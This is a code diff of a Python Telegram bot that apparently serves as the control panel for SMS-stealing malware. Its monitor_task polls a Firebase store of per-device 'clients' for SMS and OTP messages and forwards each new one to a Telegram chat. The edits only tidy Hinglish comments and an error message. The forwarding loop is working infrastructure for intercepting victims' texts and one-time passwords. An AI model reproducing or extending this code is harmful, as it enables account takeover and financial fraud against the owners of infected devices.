@@ -185,23 +185,18 @@ async def add_channel(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def monitor_task(chat_id, context):
     global is_monitoring, selected_device_id
     
-    # 1. Monitoring start hote hi current status capture karo
-    # Ye step purane messages ko ignore karne ke liye hai
+    # Snapshot taking phase
     try:
         sms_url = f"{firebase_base}/{selected_device_id}/sms.json"
         msg_url = f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json"
-        
         sms_data = requests.get(sms_url).json() or {}
         msg_data = requests.get(msg_url).json() or {}
-        
-        # 'seen_keys' mein hum woh saare message keys daal rahe hain jo abhi मौजूद hain
         seen_keys = set(sms_data.keys()) | set(msg_data.keys())
     except:
         seen_keys = set()
     
     while is_monitoring:
         try:
-            # 2. Check SMS
             sms_data = requests.get(f"{firebase_base}/{selected_device_id}/sms.json").json()
             if sms_data and isinstance(sms_data, dict):
                 for key, val in sms_data.items():
@@ -209,7 +204,6 @@ async def monitor_task(chat_id, context):
                         seen_keys.add(key)
                         await context.bot.send_message(chat_id=chat_id, text=f"📱 New SMS:\n{val}")
             
-            # 3. Check Messages/OTP
             msg_data = requests.get(f"{firebase_base.replace('/clients', '')}/messages/{selected_device_id}.json").json()
             if msg_data and isinstance(msg_data, dict):
                 for key, val in msg_data.items():
@@ -223,7 +217,7 @@ async def start_monitor(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check(update): return
     global is_monitoring
     if not selected_device_id or not monitored_channel_id:
-        await update.message.reply_text("❌ Error: Channel set karna zaroori hai!")
+        await update.message.reply_text("❌ Error: Device ya Channel set karna zaroori hai!")
         return
     is_monitoring = True
     asyncio.create_task(monitor_task(update.effective_chat.id, context))
